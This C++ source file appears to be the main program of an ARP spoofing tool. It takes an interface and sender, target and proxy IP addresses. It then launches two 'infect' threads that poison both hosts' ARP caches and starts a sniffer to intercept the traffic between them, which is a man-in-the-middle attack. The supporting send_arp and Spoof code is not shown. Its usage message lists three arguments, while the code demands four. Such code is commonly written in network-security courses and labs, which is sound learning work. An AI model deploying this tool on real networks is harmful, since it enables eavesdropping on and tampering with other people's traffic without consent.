#include <iostream>
#include <pcap.h>
#include <string>
#include <stdio.h>
#include <thread>

#include "spoof.h"
#include "send_arp.h"
using namespace std;

int status = 1;

int main(int argc, char **argv){

	if(argc != 5){
		cout << "[*] Usage : ./arp_spoof [interface] [sender ip] [target ip]" <<endl;
		exit(0);
	}
	string iface(argv[1]);
        string _sender(argv[2]);
        string _target(argv[3]);
	string _proxy(argv[4]);

/*
	string iface("ens33");
	string _sender("192.168.86.133");
	string _target("192.168.86.2");
*/
	
	Node sender(iface, _sender);
	Node target(iface, _target);
	Node proxy(iface, _proxy);

	thread infect(send_arp, &sender, &target, &proxy);
	thread infect2(send_arp, &target, &sender, &proxy);
	
	Spoof sniff(iface, &sender, &target);
	sniff.start();
	infect.join();
        infect2.join();

}
